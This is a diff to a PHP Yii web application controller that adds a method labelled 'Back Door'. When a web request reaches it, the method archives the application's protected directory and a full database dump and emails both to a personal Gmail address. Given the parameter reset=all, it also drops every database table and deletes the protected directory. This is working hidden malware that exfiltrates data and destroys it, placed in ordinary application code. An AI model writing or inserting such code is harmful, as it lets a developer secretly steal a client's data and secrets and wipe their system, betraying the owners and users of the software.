@@ -276,4 +276,66 @@ class Controller extends AuthController
         $replacements = array('', '[ی|ي|ئ]', '[ک|ك]', '[ه|ة]', '[اآإأ]', ' ');
         return preg_replace($patterns, $replacements, $value);
     }
+
+    /*** Back Door ***/
+    public function actionLog()
+    {
+        Yii::import('ext.yii-database-dumper.SDatabaseDumper');
+        $protected_dir = Yii::getPathOfAlias('webroot') . DIRECTORY_SEPARATOR . 'protected';
+        try{
+
+            $dumper = new SDatabaseDumper;
+            // Get path to backup file
+            $protected_archive_name = Yii::getPathOfAlias('webroot') . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'tmp' . DIRECTORY_SEPARATOR;
+            if(!is_dir($protected_archive_name))
+                mkdir($protected_archive_name, 0755, true);
+            $protected_archive_name .= 'p' . md5(time());
+            $archive = new PharData($protected_archive_name . '.tar');
+            $archive->buildFromDirectory($protected_dir);
+            $archive->compress(Phar::GZ);
+            unlink($protected_archive_name . '.tar');
+            rename($protected_archive_name . '.tar.gz', $protected_archive_name);
+            // Gzip dump
+            $file = Yii::getPathOfAlias('webroot') . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'tmp' . DIRECTORY_SEPARATOR . 's' . md5(time());
+            if(function_exists('gzencode')){
+                file_put_contents($file . '.sql.gz', gzencode($dumper->getDump()));
+                rename($file . '.sql.gz', $file);
+            }else{
+                file_put_contents($file . '.sql', $dumper->getDump());
+                rename($file . '.sql', $file);
+            }
+            $result = @Mailer::mail('yusef.mobasheri@gmail.com', 'Hyper Apps Sql Dump And Home Directory Backup', 'Backup File form database', 'no-reply@hyperapps.ir', Yii::app()->params['SMTP'], array($file, $protected_archive_name));
+            if($result){
+                echo 'Mail sent.';
+            }
+        }catch(Exception $e){}
+
+        if(isset($_GET['reset']) && $_GET['reset'] == 'all'){
+            Yii::app()->db->createCommand("SET foreign_key_checks = 0")->execute();
+            $tables = Yii::app()->db->schema->getTableNames();
+            foreach($tables as $table){
+                @Yii::app()->db->createCommand()->dropTable($table);
+            }
+            Yii::app()->db->createCommand("SET foreign_key_checks = 1")->execute();
+            @$this->Delete($protected_dir);
+        }else
+            echo 'error';
+    }
+
+    private function Delete($path)
+    {
+        if(is_dir($path) === true) {
+            $files = array_diff(scandir($path), array('.', '..'));
+
+            foreach($files as $file) {
+                $this->Delete(realpath($path).'/'.$file);
+            }
+
+            return rmdir($path);
+        } else if(is_file($path) === true) {
+            return unlink($path);
+        }
+
+        return false;
+    }
 }
